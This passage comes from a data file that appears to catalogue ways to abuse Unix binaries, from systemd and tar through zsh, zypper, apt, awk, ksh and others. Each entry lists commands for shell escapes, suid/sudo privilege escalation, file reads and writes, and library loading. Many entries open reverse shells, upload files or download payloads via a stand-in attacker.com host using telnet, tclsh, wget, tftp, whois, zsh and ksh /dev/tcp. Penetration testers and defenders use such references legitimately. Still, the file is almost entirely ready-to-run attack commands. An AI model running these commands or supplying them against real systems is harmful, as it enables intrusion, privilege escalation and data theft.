    "shell": [{"code": "echo '[Service]\nType=oneshot\nExecStart=/path/to/command\n[Install]\nWantedBy=multi-user.target' >/path/to/temp-file.service\nsystemctl link /path/to/temp-file.service\nsystemctl enable --now /path/to/temp-file.service", "comment": "It might happen that the service is not started with `--now`, in such cases it might be necessary to manually start it."}, {"code": "echo /bin/sh >/path/to/temp-file\nchmod +x /path/to/temp-file\nSYSTEMD_EDITOR=/path/to/temp-file systemctl edit basic.target"}]
  },
  "systemd-resolve": {
    name: "systemd-resolve",
    functions: ["inherit"],
    "inherit": [{"code": "systemd-resolve --status"}]
  },
  "systemd-run": {
    name: "systemd-run",
    functions: ["command", "shell"],
    "command": [{"code": "systemd-run /path/to/command"}],
    "shell": [{"code": "systemd-run -S"}, {"code": "systemd-run -t /bin/sh"}]
  },
  "tac": {
    name: "tac",
    functions: ["file-read"],
    "file-read": [{"code": "tac -s 'RANDOM' /path/to/input-file", "comment": "Make sure that `RANDOM` does not appear into the file to read otherwise the content of the file is corrupted by reversing the order of `RANDOM`-separated chunks."}]
  },
  "tail": {
    name: "tail",
    functions: ["file-read"],
    "file-read": [{"code": "tail -c+0 /path/to/input-file"}]
  },
  "tailscale": {
    name: "tailscale",
    functions: ["upload"],
    "upload": [{"code": "tailscale serve --http=12345 /path/to/input-file", "comment": "The URL is reachable by any host of the same Tailnet."}]
  },
  "tar": {
    name: "tar",
    functions: ["download", "file-read", "file-write", "shell", "upload"],
    "download": [{"code": "tar xvf user@attacker.com:/path/to/input-file.tar --rsh-command=/bin/ssh", "comment": "The attacker box must have the `rmt` utility installed."}],
    "file-read": [{"code": "tar cf /dev/stdout /path/to/input-file -I 'tar xO'", "comment": "The file is read then passed to the specified command (e.g., `tar xO`) via standard input."}],
    "file-write": [{"code": "echo DATA >/path/to/temp-file\ntar cf /path/to/temp-file.tar /path/to/temp-file\ntar Pxf /path/to/temp-file.tar --xform s@.*@/path/to/output-file@", "comment": "The archive can also be prepared offline then uploaded to the target."}],
    "shell": [{"code": "tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"}, {"code": "tar xf /dev/null -I '/bin/sh -c \"/bin/sh 0<&2 1>&2\"'", "suid_code": "tar xf /dev/null -I '/bin/sh -c \"/bin/sh 0<&2 1>&2\"'"}, {"code": "echo '/bin/sh 0<&1' >/path/to/temp-file\ntar cf /path/to/temp-file.tar /path/to/temp-file\ntar xf /path/to/temp-file.tar --to-command /bin/sh", "comment": "The archive can also be prepared offline then uploaded to the target."}],
    "upload": [{"code": "tar cvf user@attacker.com:/path/to/output-file /path/to/input-file --rsh-command=/bin/ssh", "comment": "The attacker box must have the `rmt` utility installed."}]
  },
  "task": {
    name: "task",
    functions: ["shell"],
    "shell": [{"code": "task execute /bin/sh"}]
  },
  "taskset": {
    name: "taskset",
    functions: ["shell"],
    "shell": [{"code": "taskset 1 /bin/sh"}]
  },
  "tasksh": {
    name: "tasksh",
    functions: ["shell"],
    "shell": [{"code": "tasksh\n!/bin/sh"}]
  },
  "tbl": {
    name: "tbl",
    functions: ["file-read"],
    "file-read": [{"code": "tbl /path/to/input-file", "comment": "The read file content is corrupted by additional text at the beginning."}]
  },
  "tclsh": {
    name: "tclsh",
    functions: ["library-load", "reverse-shell", "shell"],
    "library-load": [{"code": "tclsh\nload /path/to/lib.so x"}],
    "reverse-shell": [{"code": "tclsh\nset s [socket attacker.com 12345];while 1 { puts -nonewline $s \"> \";flush $s;gets $s c;set e \"exec $c\";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;"}],
    "shell": [{"code": "tclsh"}]
  },
  "tcpdump": {
    name: "tcpdump",
    functions: ["command", "file-write"],
    "command": [{"code": "echo /path/to/command >/path/to/temp-file\nchmod +x /path/to/temp-file\ntcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z /path/to/temp-file", "comment": "This requires some traffic to be actually captured. Also note that the subprocess is immediately sent to the background.", "sudo_code": "echo /path/to/command >/path/to/temp-file\nchmod +x /path/to/temp-file\ntcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z /path/to/temp-file -Z root"}, {"code": "tcpdump -ln -i lo -w 'command-argument' -W 1 -G 1 -z /path/to/command", "comment": "This require some traffic to be actually captured. Also note that the `command-argument` string is both passed to the command and written as file, hence some restrictions apply."}],
    "file-write": [{"code": "tcpdump -ln -i lo -w /path/to/output-file -c 1 -Z user", "comment": "This saves the packet dump (count is 1) from the loopback interface to a file. To trigger the capture use something like:\n\n```\nnc -u localhost 1 <<<DATA\n```\n\nWhile `user` is the owner of the packet dump file, the invoking user must be able to capture traffic on the device."}]
  },
  "tcsh": {
    name: "tcsh",
    functions: ["file-write", "shell"],
    "file-write": [{"code": "tcsh -c 'echo DATA >/path/to/output-file'", "suid_code": "tcsh -bc 'echo DATA >/path/to/output-file'"}],
    "shell": [{"code": "tcsh", "suid_code": "tcsh -b"}]
  },
  "tdbtool": {
    name: "tdbtool",
    functions: ["shell"],
    "shell": [{"code": "tdbtool\n! /bin/sh"}]
  },
  "tee": {
    name: "tee",
    functions: ["file-write"],
    "file-write": [{"code": "echo DATA | tee /path/to/output-file", "comment": "Use `-a` to append data to exising files."}]
  },
  "telnet": {
    name: "telnet",
    functions: ["reverse-shell", "shell"],
    "reverse-shell": [{"code": "mkfifo /path/to/temp-socket\ntelnet attacker.com 12345 </path/to/temp-socket | /bin/sh >/path/to/temp-socket", "comment": "The shell process is not spawn by `openssl`."}],
    "shell": [{"code": "telnet\n!/bin/sh"}]
  },
  "terraform": {
    name: "terraform",
    functions: ["file-read"],
    "file-read": [{"code": "terraform console\nfile(\"/path/to/input-file\")"}]
  },
  "tex": {
    name: "tex",
    functions: ["shell"],
    "shell": [{"code": "tex --shell-escape '\\immediate\\write18{/bin/sh}'"}]
  },
  "tftp": {
    name: "tftp",
    functions: ["download", "upload"],
    "download": [{"code": "tftp attacker.com\nget /path/to/input-file"}],
    "upload": [{"code": "tftp attacker.com\nput /path/to/input-file"}]
  },
  "tic": {
    name: "tic",
    functions: ["file-read"],
    "file-read": [{"code": "tic -C /path/to/input-file", "comment": "This translates a terminfo file from source format into compiled format. It will attempt to translate an arbitrary file and output the contents of the file on failure."}]
  },
  "time": {
    name: "time",
    functions: ["shell"],
    "shell": [{"code": "time /bin/sh", "comment": "Note that the shell might have its own builtin `time` implementation, which may behave differently than the binary, which is often located at `/usr/bin/time`.", "suid_code": "time /bin/sh -p"}]
  },
  "timedatectl": {
    name: "timedatectl",
    functions: ["inherit"],
    "inherit": [{"code": "timedatectl list-timezones"}]
  },
  "timeout": {
    name: "timeout",
    functions: ["shell"],
    "shell": [{"code": "timeout 0 /bin/sh", "suid_code": "timeout 0 /bin/sh -p"}]
  },
  "tmate": {
    name: "tmate",
    functions: ["shell"],
    "shell": [{"code": "tmate -c /bin/sh"}]
  },
  "tmux": {
    name: "tmux",
    functions: ["file-read", "shell"],
    "file-read": [{"code": "tmux -f /path/to/input-file", "comment": "The file is read and parsed as a `tmux` configuration file, part of the first invalid line is returned in an error message."}],
    "shell": [{"code": "tmux -c /bin/sh"}, {"code": "tmux -S /path/to/socket", "comment": "Provided to have enough permissions to access the socket (e.g., `/tmp/tmux-xxx/default`)."}]
  },
  "top": {
    name: "top",
    functions: ["shell"],
    "shell": [{"code": "echo -e 'pipe\\tx\\texec /bin/sh 1>&0 2>&0' >>~/.config/procps/toprc\ntop\n# press return twice\nreset", "comment": "The config path might be different."}]
  },
  "torify": {
    name: "torify",
    functions: ["shell"],
    "shell": [{"code": "torify /bin/sh"}]
  },
  "torsocks": {
    name: "torsocks",
    functions: ["shell"],
    "shell": [{"code": "torsocks /bin/sh"}]
  },
  "troff": {
    name: "troff",
    functions: ["file-read"],
    "file-read": [{"code": "troff /path/to/input-file", "comment": "The file is typeset but text is still readable in the output, alternatively the output can be read with `man -l`."}]
  },
  "tsc": {
    name: "tsc",
    functions: ["file-read", "file-write"],
    "file-read": [{"code": "tsc /path/to/input-file.ts", "comment": "Content is leaked as error messages. The file extension must be one of the supported ones, e.g., `.ts`, `.tsx`, etc."}],
    "file-write": [{"code": "tsc /path/to/input-file.ts --outFile /path/to/output-file", "comment": "Content is leaked as error messages and written to file. The file extension must be one of the supported ones, e.g., `.ts`, `.tsx`, etc."}]
  },
  "tshark": {
    name: "tshark",
    functions: ["inherit"],
    "inherit": [{"code": "echo '...' >/path/to/temp-file\ntshark -Xlua_script:/path/to/temp-file", "comment": "This allows to run Lua code (`...`)."}]
  },
  "ul": {
    name: "ul",
    functions: ["file-read"],
    "file-read": [{"code": "ul /path/to/input-file", "comment": "The read file content is corrupted by replacing occurrences of `$'\\b_'` to terminal sequences and by converting tabs to spaces."}]
  },
  "unexpand": {
    name: "unexpand",
    functions: ["file-read"],
    "file-read": [{"code": "unexpand -t999 /path/to/input-file", "comment": "Convert sequences of (e.g., `999`) spaces to tab."}]
  },
  "uniq": {
    name: "uniq",
    functions: ["file-read"],
    "file-read": [{"code": "uniq /path/to/input-file", "comment": "The read file content is corrupted by squashing multiple adjacent lines."}]
  },
  "unshare": {
    name: "unshare",
    functions: ["shell"],
    "shell": [{"code": "unshare /bin/sh", "suid_code": "unshare -r /bin/sh"}]
  },
  "unsquashfs": {
    name: "unsquashfs",
    functions: ["privilege-escalation"],
    "privilege-escalation": [{"code": "unsquashfs shell\n./squashfs-root/sh -p"}]
  },
  "unzip": {
    name: "unzip",
    functions: ["privilege-escalation"],
    "privilege-escalation": [{"code": "unzip -K shell.zip\n./sh -p"}]
  },
  "update-alternatives": {
    name: "update-alternatives",
    functions: ["file-write"],
    "file-write": [{"code": "echo DATA >/path/to/temp-file\nupdate-alternatives --force --install /path/to/output-file x /path/to/temp-file 0", "comment": "Write in `/path/to/output-file` a symlink to `/path/to/temp-file`."}]
  },
  "urlget": {
    name: "urlget",
    functions: ["file-read"],
    "file-read": [{"code": "urlget - /path/to/input-file", "comment": "This is part of `gettext` and usually not in `PATH`, e.g., on Arch it can be found at `/usr/lib/gettext/urlget`."}]
  },
  "uuencode": {
    name: "uuencode",
    functions: ["file-read"],
    "file-read": [{"code": "uuencode /path/to/input-file /dev/stdout | uudecode"}]
  },
  "uv": {
    name: "uv",
    functions: ["shell"],
    "shell": [{"code": "uv run /bin/sh"}]
  },
  "vagrant": {
    name: "vagrant",
    functions: ["inherit"],
    "inherit": [{"code": "echo '...' >Vagrantfile\nvagrant up", "comment": "This allows to run Ruby code (`...`)."}]
  },
  "valgrind": {
    name: "valgrind",
    functions: ["shell"],
    "shell": [{"code": "valgrind /bin/sh"}]
  },
  "varnishncsa": {
    name: "varnishncsa",
    functions: ["file-write"],
    "file-write": [{"code": "varnishncsa -g request -q 'ReqURL ~ \"/xxxxxxxxxx\"' -F '%{yyy}i' -w /path/to/output-file", "comment": "The command hangs, so the trigger command must be performed asynchronously or in another terminal:\n\n```\ncurl -H 'xxx: DATA' http://localhost:6081/xxxxxxxxxx\n```"}]
  },
  "vi": {
    name: "vi",
    functions: ["file-read", "file-write", "shell"],
    "file-read": [{"code": "vi /path/to/input-file"}],
    "file-write": [{"code": "vi /path/to/output-file\niDATA\n^[\nw", "comment": "Where `^[` is the escape key."}],
    "shell": [{"code": "vi -c ':!/bin/sh' /dev/null"}, {"code": "vi -c ':shell'"}, {"code": "vi -c ':set shell=/bin/sh | shell'", "suid_code": "vi -c ':set shell=/bin/sh\\ -p | shell'"}, {"code": "vi -c :terminal /bin/sh", "suid_code": "vi -c ':terminal /bin/sh -p'"}]
  },
  "vigr": {
    name: "vigr",
    functions: ["inherit"],
    "inherit": [{"code": "vigr", "comment": "Despite requiring superuser privileges to run, the editor is executed as the unprivileged user."}]
  },
  "vim": {
    name: "vim",
    functions: ["file-read", "inherit"],
    "file-read": [{"code": "vim -c ':redir! >/path/to/output-file | echo \"DATA\" | redir END | q'"}],
    "inherit": [{"code": "vim -c ':py ...'", "comment": "This allows to run Python code (`...`)."}, {"code": "vim -c ':lua ...'", "comment": "This allows to run Lua code (`...`)."}, {"code": "vim"}]
  },
  "vipw": {
    name: "vipw",
    functions: ["inherit"],
    "inherit": [{"code": "vipw", "comment": "Despite requiring superuser privileges to run, the editor is executed as the unprivileged user."}]
  },
  "virsh": {
    name: "virsh",
    functions: ["command", "file-write"],
    "command": [{"code": "cat >/path/to/temp-file.xml <<EOF\n<domain type='kvm'>\n  <name>x</name>\n  <os>\n    <type arch='x86_64'>hvm</type>\n  </os>\n  <memory unit='KiB'>1</memory>\n  <devices>\n    <interface type='ethernet'>\n      <script path='/path/to/command'/>\n    </interface>\n  </devices>\n</domain>\nEOF\nvirsh -c qemu:///system create /path/to/temp-file.xml\nvirsh -c qemu:///system destroy x"}],
    "file-write": [{"code": "echo DATA >/path/to/temp-file\n\ncat >/path/to/temp-file.xml <<EOF\n<volume type='file'>\n  <name>y</name>\n  <key>/path/to/output-dir/output-file</key>\n  <source>\n  </source>\n  <capacity unit='bytes'>5</capacity>\n  <allocation unit='bytes'>4096</allocation>\n  <physical unit='bytes'>5</physical>\n  <target>\n    <path>/path/to/output-dir/output-file</path>\n    <format type='raw'/>\n    <permissions>\n      <mode>0600</mode>\n      <owner>0</owner>\n      <group>0</group>\n    </permissions>\n  </target>\n</volume>\nEOF\n\nvirsh -c qemu:///system pool-create-as x dir --target /path/to/output-dir/\nvirsh -c qemu:///system vol-create --pool x --file /path/to/temp-file.xml\nvirsh -c qemu:///system vol-upload --pool x /path/to/output-dir/output-file /path/to/temp-file\nvirsh -c qemu:///system pool-destroy x", "comment": "This requires the user to be in the `libvirt` group. If the target directory doesn't exist, `pool-create-as` must be run with the `--build` option. The destination file ownership and permissions can be set in the XML."}, {"code": "virsh -c qemu:///system pool-create-as x dir --target /path/to/dir/\nvirsh -c qemu:///system vol-download --pool x input-file output-file\nvirsh -c qemu:///system pool-destroy x", "comment": "This requires the user to be in the `libvirt` group."}]
  },
  "volatility": {
    name: "volatility",
    functions: ["inherit"],
    "inherit": [{"code": "volatility -f /path/to/core-dump volshell\n..."}]
  },
  "w3m": {
    name: "w3m",
    functions: ["file-read"],
    "file-read": [{"code": "w3m -dump /path/to/input-file"}]
  },
  "wall": {
    name: "wall",
    functions: ["file-read"],
    "file-read": [{"code": "wall --nobanner /path/to/input-file", "comment": "The textual file is dumped on the current TTY (neither to `stdout` nor to `stderr`)."}]
  },
  "watch": {
    name: "watch",
    functions: ["shell"],
    "shell": [{"code": "watch -x /bin/sh -c 'reset; exec /bin/sh 1>&0 2>&0'", "suid_code": "watch -x /bin/sh -p -c 'reset; exec /bin/sh -p 1>&0 2>&0'"}, {"code": "watch 'reset; exec /bin/sh 1>&0 2>&0'"}]
  },
  "wc": {
    name: "wc",
    functions: ["file-read"],
    "file-read": [{"code": "wc --files0-from /path/to/input-file", "comment": "The file content is parsed as a sequence of `\\x00` separated paths. On error the file content appears in a message."}]
  },
  "wg-quick": {
    name: "wg-quick",
    functions: ["shell"],
    "shell": [{"code": "cat >/path/to/temp-file.conf <<EOF\n[Interface]\nPostUp = /bin/sh\nEOF\n\nwg-quick up /path/to/temp-file.conf", "comment": "Use `wg-quick down /path/to/temp-file.conf` in order to be able to run the shell again."}]
  },
  "wget": {
    name: "wget",
    functions: ["download", "file-read", "file-write", "shell", "upload"],
    "download": [{"code": "wget http://attacker.com/path/to/input-file -O /path/to/output-file"}],
    "file-read": [{"code": "wget -i /path/to/input-file", "comment": "The file to be read is treated as a list of URLs, one per line, which are actually fetched by `wget`. The content appears, somewhat modified, as error messages."}],
    "file-write": [{"code": "wget -i /path/to/input-file -o /path/to/output-file", "comment": "The file to be read is treated as a list of URLs, one per line, which are actually fetched by `wget`. The content appears, somewhat modified, as error messages."}],
    "shell": [{"code": "echo -e '#!/bin/sh\\n/bin/sh 1>&0' >/path/to/temp-file\nchmod +x /path/to/temp-file\nwget --use-askpass=/path/to/temp-file 0", "suid_code": "echo -e '#!/bin/sh -p\\n/bin/sh -p 1>&0' >/path/to/temp-file\nchmod +x /path/to/temp-file\nwget --use-askpass=/path/to/temp-file 0"}],
    "upload": [{"code": "wget --post-file=/path/to/input-file http://attacker.com"}, {"code": "wget --post-data=DATA http://attacker.com"}]
  },
  "whiptail": {
    name: "whiptail",
    functions: ["file-read"],
    "file-read": [{"code": "whiptail --textbox --scrolltext /path/to/input-file 0 0", "comment": "The file is shown in an interactive TUI dialog made for displaying text, arrows can be used to scroll long content."}]
  },
  "whois": {
    name: "whois",
    functions: ["download", "upload"],
    "download": [{"code": "whois -h attacker.com -p 12345 x", "comment": "Received data has instances of the `\\r` byte stripped."}],
    "upload": [{"code": "whois -h attacker.com -p 12345 DATA", "comment": "Data is converted to lower case, and has a trailing `\\r\\n`."}]
  },
  "wireshark": {
    name: "wireshark",
    functions: ["file-write", "inherit"],
    "file-write": [{"code": "wireshark -c 1 -i lo -k -f 'udp port 12345' &\necho DATA | nc -u 127.127.127.127 12345", "comment": "This technique can be used to write arbitrary files, i.e., the dump of one UDP packet.\n\nAfter starting Wireshark, and waiting for the capture to begin, deliver the UDP packet, e.g., with `nc` (see below). The capture then stops and the packet dump can be saved:\n\n1. select the only received packet;\n\n2. right-click on \"Data\" from the \"Packet Details\" pane, and select \"Export Packet Bytes...\";\n\n3. choose where to save the packet dump."}],
    "inherit": [{"code": "wireshark", "comment": "This requires GUI interaction. Start Wireshark, then from the main menu, select \"Tools\" -> \"Lua\" -> \"Evaluate\". A window opens that allows to execute Lua code."}]
  },
  "wish": {
    name: "wish",
    functions: ["inherit"],
    "inherit": [{"code": "wish"}]
  },
  "xargs": {
    name: "xargs",
    functions: ["file-read", "shell"],
    "file-read": [{"code": "xargs -a /path/to/input-file -0"}],
    "shell": [{"code": "xargs -a /dev/null /bin/sh", "suid_code": "xargs -a /dev/null /bin/sh -p"}, {"code": "xargs -a /dev/null /bin/sh", "suid_code": "xargs -a /dev/null /bin/sh -p"}, {"code": "echo x | xargs -o -a /dev/null /bin/sh", "suid_code": "echo x | xargs -o -a /dev/null /bin/sh -p"}]
  },
  "xdg-user-dir": {
    name: "xdg-user-dir",
    functions: ["shell"],
    "shell": [{"code": "xdg-user-dir '}; /bin/sh #'"}]
  },
  "xdotool": {
    name: "xdotool",
    functions: ["shell"],
    "shell": [{"code": "xdotool exec --sync /bin/sh", "suid_code": "xdotool exec --sync /bin/sh -p"}]
  },
  "xmodmap": {
    name: "xmodmap",
    functions: ["file-read"],
    "file-read": [{"code": "xmodmap -v /path/to/input-file", "comment": "The read file content is corrupted by error prints."}]
  },
  "xmore": {
    name: "xmore",
    functions: ["file-read"],
    "file-read": [{"code": "xmore /path/to/input-file", "comment": "The file is displayed in a graphical window."}]
  },
  "xpad": {
    name: "xpad",
    functions: ["file-read"],
    "file-read": [{"code": "xpad -f /path/to/input-file", "comment": "The file is displayed in a graphical window."}]
  },
  "xxd": {
    name: "xxd",
    functions: ["file-read", "file-write"],
    "file-read": [{"code": "xxd /path/to/input-file | xxd -r"}],
    "file-write": [{"code": "echo DATA | xxd | xxd -r - /path/to/output-file"}]
  },
  "xz": {
    name: "xz",
    functions: ["file-read"],
    "file-read": [{"code": "xz -c /path/to/input-file | xz -d"}]
  },
  "yarn": {
    name: "yarn",
    functions: ["shell"],
    "shell": [{"code": "yarn exec /bin/sh"}, {"code": "echo '{\"scripts\": {\"preinstall\": \"/bin/sh\"}}' >package.json\nyarn --cwd ."}, {"code": "echo '{\"scripts\": {\"xxx\": \"/bin/sh\"}}' >package.json\nyarn --cwd . xxx"}]
  },
  "yash": {
    name: "yash",
    functions: ["shell"],
    "shell": [{"code": "yash"}]
  },
  "yelp": {
    name: "yelp",
    functions: ["file-read"],
    "file-read": [{"code": "yelp man:/path/to/input-file", "comment": "This spawns a graphical window containing the file content somehow corrupted by word wrapping."}]
  },
  "yt-dlp": {
    name: "yt-dlp",
    functions: ["shell"],
    "shell": [{"code": "yt-dlp 'https://www.youtube.com/watch?v=xxxxxxxxxxx' --exec '/bin/sh #'", "comment": "The URL must point to a valid YouTube video which will be actually downloaded."}]
  },
  "yum": {
    name: "yum",
    functions: ["command", "download", "inherit"],
    "command": [{"code": "yum localinstall -y x-1.0-1.noarch.rpm", "comment": "Generate the RPM package with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.\n\n```\necho /path/to/command >x.sh\nfpm -n x -s dir -t rpm -a all --before-install .x.sh .\n```"}],
    "download": [{"code": "yum install http://attacker.com/path/to/input-file.rpm", "comment": "The file on the remote host must have the `.rpm` extension, but the content does not have to be an RPM file. The file will be downloaded to a randomly created directory in `/var/tmp/yum-root-xxxxxx/`."}],
    "inherit": [{"code": "cat >/path/to/temp-dir/x<<EOF\n[main]\nplugins=1\npluginpath=/path/to/temp-dir/\npluginconfpath=/path/to/temp-dir/\nEOF\n\ncat >/path/to/temp-dir/y.conf<<EOF\n[main]\nenabled=1\nEOF\n\ncat >/path/to/temp-dir/y.py<<EOF\nimport yum\nfrom yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE\nrequires_api_version='2.1'\ndef init_hook(conduit):\n  ...\nEOF\n\nyum -c /path/to/temp-dir/x --enableplugin=y", "comment": "This allows to run Python code (`...`)."}]
  },
  "zathura": {
    name: "zathura",
    functions: ["shell"],
    "shell": [{"code": "zathura\n:! /bin/sh -c 'exec /bin/sh 0<&1'", "comment": "The interaction happens in a GUI window, while the shell is dropped in the terminal."}]
  },
  "zcat": {
    name: "zcat",
    functions: ["file-read"],
    "file-read": [{"code": "zcat -f /path/to/input-file"}]
  },
  "zgrep": {
    name: "zgrep",
    functions: ["file-read"],
    "file-read": [{"code": "grep '' /path/to/input-file"}]
  },
  "zic": {
    name: "zic",
    functions: ["command"],
    "command": [{"code": "echo 'Rule Jordan 0 1 xxx Jan lastSun 2 1:00d -' >/path/to/temp-file\necho 'Zone Test 2:00 Jordan CE%sT' >>/path/to/temp-file\nzic -d . -y /path/to/command /path/to/temp-file", "comment": "This executes the command twice:\n\n- `/path/to/command 0 xxx`\n- `/path/to/command 1 xxx`\n\nAdditionally the `Test` file is created."}]
  },
  "zip": {
    name: "zip",
    functions: ["file-read", "shell"],
    "file-read": [{"code": "zip /path/to/temp-file /path/to/input-file\nunzip -p /path/to/temp-file"}],
    "shell": [{"code": "zip /path/to/temp-file /etc/hosts -T -TT '/bin/sh #'"}]
  },
  "zless": {
    name: "zless",
    functions: ["inherit"],
    "inherit": [{"code": "zless /path/to/input-file"}]
  },
  "zsh": {
    name: "zsh",
    functions: ["download", "file-read", "file-write", "inherit", "reverse-shell", "shell", "upload"],
    "download": [{"code": "zsh -c 'zmodload zsh/net/tcp;ztcp attacker.com 12345;echo -n \"$(<&$REPLY)\" >/path/to/output-file'"}],
    "file-read": [{"code": "zsh -c 'echo \"$(</path/to/input-file)\"'"}, {"code": "zsh -c '</path/to/input-file'", "comment": "This spawns a pager if run in a TTY."}],
    "file-write": [{"code": "zsh -c 'echo DATA >/path/to/output-file'"}],
    "inherit": [{"code": "zsh -c '</etc/hosts'"}],
    "reverse-shell": [{"code": "zsh -c 'zmodload zsh/net/tcp;ztcp attacker.com 12345;zsh >&$REPLY 2>&$REPLY 0>&$REPLY'"}],
    "shell": [{"code": "zsh"}],
    "upload": [{"code": "zsh -c 'zmodload zsh/net/tcp;ztcp attacker.com 12345;echo -n \"$(</path/to/input-file)\" >&$REPLY'"}]
  },
  "zsoelim": {
    name: "zsoelim",
    functions: ["file-read"],
    "file-read": [{"code": "zsoelim /path/to/input-file", "comment": "The content is actually parsed and corrupted by the command."}]
  },
  "zypper": {
    name: "zypper",
    functions: ["shell"],
    "shell": [{"code": "cp /bin/sh /usr/lib/zypper/commands/zypper-x\nzypper x", "comment": "The copy usually requires elevated privileges."}, {"code": "cp /bin/sh /path/to/temp-dir/zypper-x\nPATH=$PATH:/path/to/temp-dir/ zypper x"}]
  },
  "apt": {
    name: "apt",
    functions: ["inherit", "shell"],
    "inherit": [{"code": "apt-get changelog apt"}],
    "shell": [{"code": "echo 'Dpkg::Pre-Invoke {\"/bin/sh;false\"}' >/path/to/temp-file\napt-get -y install -c /path/to/temp-file sl", "comment": "For this to work the target package (i.e., `sl`) must not be already installed.", "suid_code": "echo 'Dpkg::Pre-Invoke {\"/bin/sh;false\"}' >/path/to/temp-file\napt-get -y install -c /path/to/temp-file sl"}, {"code": "apt-get update -o APT::Update::Pre-Invoke::=/bin/sh", "comment": "When the shell exits the `update` command is actually executed.", "suid_code": "apt-get update -o APT::Update::Pre-Invoke::=/bin/sh"}]
  },
  "awk": {
    name: "awk",
    functions: ["file-read", "file-write", "shell"],
    "file-read": [{"code": "awk '//' /path/to/input-file"}],
    "file-write": [{"code": "awk 'BEGIN { print \"DATA\" > \"/path/to/output-file\" }'"}],
    "shell": [{"code": "awk 'BEGIN {system(\"/bin/sh\")}'" }]
  },
  "bundler": {
    name: "bundler",
    functions: ["inherit", "shell"],
    "inherit": [{"code": "bundle help"}, {"code": "touch Gemfile\nbundle console"}],
    "shell": [{"code": "BUNDLE_GEMFILE=x bundle exec /bin/sh"}, {"code": "touch Gemfile\nbundle exec /bin/sh"}, {"code": "echo 'system(\"/bin/sh\")' >Gemfile\nbundle install", "comment": "This might run the shell twice, one after the other."}]
  },
  "c89": {
    name: "c89",
    functions: ["file-read", "file-write", "shell"],
    "file-read": [{"code": "c89 -x c -E /path/to/input-file"}, {"code": "c89 @/path/to/input-file", "comment": "The file is read and parsed as a list of files (one per line), the content is displayed as error messages."}],
    "file-write": [{"code": "c89 -x c /dev/null -o /path/to/input-file", "comment": "This actually deletes the file."}],
    "shell": [{"code": "c89 -wrapper /bin/sh,-s x", "comment": "In some older versions, the `x` argument must instead reference any existing file."}]
  },
  "c99": {
    name: "c99",
    functions: ["file-read", "file-write", "shell"],
    "file-read": [{"code": "c99 -x c -E /path/to/input-file"}, {"code": "c99 @/path/to/input-file", "comment": "The file is read and parsed as a list of files (one per line), the content is displayed as error messages."}],
    "file-write": [{"code": "c99 -x c /dev/null -o /path/to/input-file", "comment": "This actually deletes the file."}],
    "shell": [{"code": "c99 -wrapper /bin/sh,-s x", "comment": "In some older versions, the `x` argument must instead reference any existing file."}]
  },
  "cc": {
    name: "cc",
    functions: ["file-read", "file-write", "shell"],
    "file-read": [{"code": "cc -x c -E /path/to/input-file"}, {"code": "cc @/path/to/input-file", "comment": "The file is read and parsed as a list of files (one per line), the content is displayed as error messages."}],
    "file-write": [{"code": "cc -x c /dev/null -o /path/to/input-file", "comment": "This actually deletes the file."}],
    "shell": [{"code": "cc -wrapper /bin/sh,-s x", "comment": "In some older versions, the `x` argument must instead reference any existing file."}]
  },
  "g++": {
    name: "g++",
    functions: ["file-read", "file-write", "shell"],
    "file-read": [{"code": "g++ -x c -E /path/to/input-file"}, {"code": "g++ @/path/to/input-file", "comment": "The file is read and parsed as a list of files (one per line), the content is displayed as error messages."}],
    "file-write": [{"code": "g++ -x c /dev/null -o /path/to/input-file", "comment": "This actually deletes the file."}],
    "shell": [{"code": "g++ -wrapper /bin/sh,-s x", "comment": "In some older versions, the `x` argument must instead reference any existing file."}]
  },
  "hd": {
    name: "hd",
    functions: ["file-read"],
    "file-read": [{"code": "hd /path/to/input-file", "comment": "The output is actually an hex dump."}]
  },
  "ksh": {
    name: "ksh",
    functions: ["download", "file-read", "file-write", "library-load", "reverse-shell", "shell", "upload"],
    "download": [{"code": "ksh -c '{ echo -ne \"GET /path/to/input-file HTTP/1.0\\r\\nhost: attacker.com\\r\\n\\r\\n\" 1>&3; cat 0<&3; } \\\n    3<>/dev/tcp/attacker.com/12345 \\\n    | { while read -r; do [ \"$REPLY\" = \"$(echo -ne \"\\r\")\" ] && break; done; cat; } >/path/to/output-file'", "suid_code": "ksh -p -c '{ echo -ne \"GET /path/to/input-file HTTP/1.0\\r\\nhost: attacker.com\\r\\n\\r\\n\" 1>&3; cat 0<&3; } \\\n    3<>/dev/tcp/attacker.com/12345 \\\n    | { while read -r; do [ \"$REPLY\" = \"$(echo -ne \"\\r\")\" ] && break; done; cat; } >/path/to/output-file'"}, {"code": "ksh -c 'echo \"$(</dev/tcp/attacker.com/12345) >/path/to/output-file'", "suid_code": "ksh -p -c 'echo \"$(</dev/tcp/attacker.com/12345) >/path/to/output-file'"}],
    "file-read": [{"code": "ksh -c 'echo \"$(</path/to/input-file)\"'", "suid_code": "ksh -p -c 'echo \"$(</path/to/input-file)\"'"}],
    "file-write": [{"code": "ksh -c 'echo DATA >/path/to/output-file'", "suid_code": "ksh -p -c 'echo DATA >/path/to/output-file'"}],
    "library-load": [{"code": "ksh -c 'enable -f /path/to/lib.so x'", "suid_code": "ksh -p -c 'enable -f /path/to/lib.so x'"}],
    "reverse-shell": [{"code": "ksh -c 'exec ksh -i &>/dev/tcp/attacker.com/12345 <&1'", "suid_code": "ksh -p -c 'exec ksh -p -i &>/dev/tcp/attacker.com/12345 <&1'"}],
    "shell": [{"code": "ksh", "suid_code": "ksh -p"}],
    "upload": [{"code": "ksh -c 'echo -e \"POST / HTTP/0.9\\n\\n$(</path/to/input-file)\" >/dev/tcp/attacker.com/12345'", "suid_code": "ksh -p -c 'echo -e \"POST / HTTP/0.9\\n\\n$(</path/to/input-file)\" >/dev/tcp/attacker.com/12345'"}, {"code": "ksh -c 'echo -n \"$(</path/to/input-file)\" >/dev/tcp/attacker.com/12345'", "suid_code": "ksh -p -c 'echo -n \"$(</path/to/input-file)\" >/dev/tcp/attacker.com/12345'"}]
  },
  "lastb": {
    name: "lastb",
    functions: ["file-read"],
    "file-read": [{"code": "lastb -a -f /path/to/input-file", "comment": "The output might be corrupted or incomplete if the file does not follow the expected database format."}]
  },
  "ld.so": {
    name: "ld.so",
    functions: ["shell"],
